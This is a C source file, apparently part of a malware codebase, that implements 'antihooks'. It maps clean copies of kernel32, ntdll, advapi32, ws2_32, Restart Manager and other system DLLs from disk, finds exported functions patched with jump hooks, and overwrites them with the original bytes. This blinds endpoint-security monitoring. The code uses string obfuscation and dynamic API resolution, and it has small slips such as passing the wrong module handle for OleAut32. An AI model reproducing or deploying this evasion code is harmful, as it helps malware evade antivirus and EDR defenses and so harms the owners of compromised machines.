#pragma once

#include "antihooks.h"
#include "../obfuscation/MetaString.h"
#include "../api/getapi.h"


#define DEREF(name) *(UINT_PTR*)(name)
#define DEREF_64(name) *(DWORD64*)(name)
#define DEREF_32(name) *(DWORD*)(name)
#define DEREF_16(name) *(WORD*)(name)
#define DEREF_8(name) *(BYTE*)(name)

VOID DisableHooks()
{
    HMODULE hKernel32 = apLoadLibraryA(OBFA("kernel32.dll"));
    HMODULE hWs2_32 = apLoadLibraryA(OBFA("ws2_32.dll"));
    HMODULE hAdvapi32 = apLoadLibraryA(OBFA("Advapi32.dll"));
    HMODULE hNtdll = apLoadLibraryA(OBFA("ntdll.dll"));
    HMODULE hRstrtmgr = apLoadLibraryA(OBFA("Rstrtmgr.dll"));
    HMODULE hOle32 = apLoadLibraryA(OBFA("Ole32.dll"));
    HMODULE hOleAut = apLoadLibraryA(OBFA("OleAut32.dll"));
    HMODULE hNetApi32 = apLoadLibraryA(OBFA("Netapi32.dll"));
    HMODULE hIphlp32 = apLoadLibraryA(OBFA("Iphlpapi.dll"));
    HMODULE hShlwapi = apLoadLibraryA(OBFA("Shlwapi.dll"));
    HMODULE hShell32 = apLoadLibraryA(OBFA("Shell32.dll"));


    if (hKernel32) {
        removeHooks(hKernel32);
    }


    if (hWs2_32) {
        removeHooks(hWs2_32);
    }

    if (hAdvapi32) {
        removeHooks(hAdvapi32);
    }


    if (hRstrtmgr) {

        getapi::SetRestartManagerLoaded(TRUE);
        removeHooks(hRstrtmgr);

    }

    if (hOle32) {
        removeHooks(hOle32);
    }

    if (hOleAut) {
        removeHooks(hOle32);
    }

    if (hNetApi32) {
        removeHooks(hNetApi32);
    }

    if (hIphlp32) {
        removeHooks(hIphlp32);
    }

    if (hShlwapi) {
        removeHooks(hShlwapi);
    }

    if (hShell32) {
        removeHooks(hShell32);
    }

    if (hNtdll) {
        removeHooks(hNtdll);
    }

}

int m_memcmp(const void* buf1, const void* buf2, size_t count)
{
    if (!buf1 || !buf2)
    {
        return -1;
    }

    unsigned char* p1 = (unsigned char*)buf1;
    unsigned char* p2 = (unsigned char*)buf2;

    int   rc = 0;

    for (size_t i = 0; i < count; i++)
    {
        if (*p1 < *p2)
        {
            rc = -1;
            break;
        }

        if (*p1 > * p2)
        {
            rc = 1;
            break;
        }

        p1++;
        p2++;
    }

    return rc;
}

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
    WORD wIndex = 0;
    WORD wNumberOfSections = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    if (pNtHeaders->OptionalHeader.Magic == 0x010B) {

        // PE32

        PIMAGE_NT_HEADERS32 pNtHeaders32 = (PIMAGE_NT_HEADERS32)pNtHeaders;
        pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders32->OptionalHeader) + pNtHeaders32->FileHeader.SizeOfOptionalHeader);
        wNumberOfSections = pNtHeaders32->FileHeader.NumberOfSections;
    }
    else {
        if (pNtHeaders->OptionalHeader.Magic == 0x020B) {

            // PE64

            PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)pNtHeaders;
            pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders64->OptionalHeader) + pNtHeaders64->FileHeader.SizeOfOptionalHeader);
            wNumberOfSections = pNtHeaders64->FileHeader.NumberOfSections;
        }
        else
        {
            return 0;
        }
    }

    if (dwRva < pSectionHeader[0].PointerToRawData)
        return dwRva;

    for (wIndex = 0; wIndex < wNumberOfSections; wIndex++) {

        if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData)) {

            return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
        }
    }

    return 0;
}

bool ah_isalfanum(const char C)
{
    bool res = (C >= 'a' && C <= 'z') || (C >= 'A' && C <= 'Z') || (C >= '0' && C <= '9');
    return res;
}

bool isForwardedFunc(const void* funcAddr)
{
    char* func = (char*)funcAddr;
    const int max_check = 128;
    bool forwarder = true;

    for (int i = 0; func[i] && i < max_check; ++i) {

        if (!(ah_isalfanum(func[i]) || func[i] == '.' || func[i] == '_' || func[i] == '-')) {
            forwarder = false;
            break;
        }
    }

    return forwarder;
}


VOID removeHooks(HMODULE hmodule)
{
    UINT_PTR uiBaseAddress = 0;
    UINT_PTR uiExportDir = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    DWORD dwCounter = 0;
    volatile int pe32magic = 0x10b;
    volatile int pe64magic = 0x20b;
    TCHAR moduleRealPath[MAX_PATH];

    HANDLE hFileMap = NULL;
    HANDLE hFile = NULL;

    LPBYTE originDll = NULL;
    int res = 0;

    HMODULE hKernel32 = apLoadLibraryA(_STR("kernel32.dll"));

    /*
#ifdef UNICODE
    typedef DWORD(WINAPI* GetModuleFileNameFunc)(HMODULE, LPWSTR, DWORD);
    GetModuleFileNameFunc pGetModuleFileName =
        (GetModuleFileNameFunc)GetProcAddress(hKernel32, _STR("GetModuleFileNameW"));
#else
    typedef DWORD(WINAPI* GetModuleFileNameFunc)(HMODULE, LPSTR, DWORD);
    GetModuleFileNameFunc pGetModuleFileName =
        (GetModuleFileNameFunc)GetProcAddress(hKernel32, _STR("GetModuleFileNameA"));
#endif // UNICODE
*/

    apGetModuleFileNameW(hmodule, moduleRealPath, MAX_PATH);

    /*
#ifdef UNICODE
    typedef HANDLE(WINAPI* CreateFileFunc)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD,
        DWORD, HANDLE);
    CreateFileFunc pCreateFile = (CreateFileFunc)GetProcAddress(hKernel32,
        _STR("CreateFileW"));
#else
    typedef HANDLE(WINAPI* CreateFileFunc)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD,
        DWORD, HANDLE);
    CreateFileFunc pCreateFile = (CreateFileFunc)GetProcAddress(hKernel32,
        _STR("CreateFileA"));
#endif // UNICODE
*/

    hFile = pCreateFileW(moduleRealPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, 0);
    if (!hFile)
        return;

    /*
    typedef DWORD(WINAPI* GetFileSizeFunc)(HANDLE, LPDWORD);
    GetFileSizeFunc pGetFileSize = (GetFileSizeFunc)GetProcAddress(hKernel32,
        _STR("GetFileSize"));

    typedef BOOL(WINAPI* CloseHandleFunc)(HANDLE);
    CloseHandleFunc pCloseHandle = (CloseHandleFunc)GetProcAddress(hKernel32,
        _STR("CloseHandle"));
        */



    DWORD Size = 0;
    DWORD H;
    LARGE_INTEGER LargeInt;
    pGetFileSizeEx(hFile, &LargeInt);
    Size = LargeInt.QuadPart;
    if (!Size)
    {
        pCloseHandle(hFile);
        return;
    }

    /*
#ifdef UNICODE
    typedef HANDLE(WINAPI* CreateFileMappingFunc)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD,
        DWORD, LPCWSTR);
    CreateFileMappingFunc pCreateFileMapping =
        (CreateFileMappingFunc)GetProcAddress(hKernel32, _STR("CreateFileMappingW"));
#else
    typedef HANDLE(WINAPI* CreateFileMappingFunc)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD,
        DWORD, LPCSTR);
    CreateFileMappingFunc pCreateFileMapping =
        (CreateFileMappingFunc)GetProcAddress(hKernel32, _STR("CreateFileMappingA"));
#endif // UNICODE
*/

    hFileMap = apCreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hFileMap)
    {
        pCloseHandle(hFile);
        return;
    }

    /*
    typedef LPVOID(WINAPI* MapViewOfFileFunc)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
    MapViewOfFileFunc pMapViewOfFile = (MapViewOfFileFunc)GetProcAddress(hKernel32,
        _STR("MapViewOfFile"));
        */

    originDll = (LPBYTE)apMapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, Size);
    if (!originDll)
    {
        pCloseHandle(hFileMap);
        pCloseHandle(hFile);
        return;
    }

    uiBaseAddress = (UINT_PTR)originDll;

    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe32magic)
    {
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS32)
            uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else
    {
        if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe64magic)
        {
            uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS64)
                uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        }
        else
        {
            pCloseHandle(hFileMap);
            pCloseHandle(hFile);
            return;
        }
    }

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress
        + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress
        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress
        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions,
            uiBaseAddress);

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress
        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals,
            uiBaseAddress);

    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

    // через все экпортируемые функции
    for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD))
    {

        char* cpExportedFunctionName = (char*)(uiBaseAddress
            + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

        uiAddressArray = uiBaseAddress
            + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions,
                uiBaseAddress);

        // use the functions name ordinal as an index into the array of name pointers
        uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

        // compute the File Offset to the function code
        UINT_PTR funcAddr = uiBaseAddress + Rva2Offset(DEREF_32(uiAddressArray),
            uiBaseAddress);

        bool isForwarder = isForwardedFunc((const void*)funcAddr);

        // forwarder обычно и начинается с прыжка на настоящее тело
        if (isForwarder) continue;

        void* funcHooked = apGetProcAddress(hmodule, cpExportedFunctionName);

        if (!funcHooked) continue;

        BYTE* p = (BYTE*)funcHooked;
        if (p[0] != 0xe9) {
            if (p[0] != 0xff) continue;
            if (p[1] != 0x25) continue;
        }

#ifdef __MINGW32__
        bool funcIsHooked = (memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0);
#else
        bool funcIsHooked = m_memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0;
#endif // __MINGW32
        if (!funcIsHooked) continue;

        DWORD oldProtect = 0;
        DWORD oldProtect1 = 0;

        /*
        typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
        VirtualProtectFunc pVirtualProtect = (VirtualProtectFunc)GetProcAddress(hKernel32,
            _STR("VirtualProtect"));
            */

        if (!apVirtualProtect(funcHooked, 64, PAGE_EXECUTE_READWRITE, &oldProtect))
            break;

        //memcpy((void*)funcHooked, (void*)funcAddr, 10);
        CopyMemory((void*)funcHooked, (void*)funcAddr, 10);

        if (!apVirtualProtect(funcHooked, 64, oldProtect, &oldProtect1))
            break;
    }
}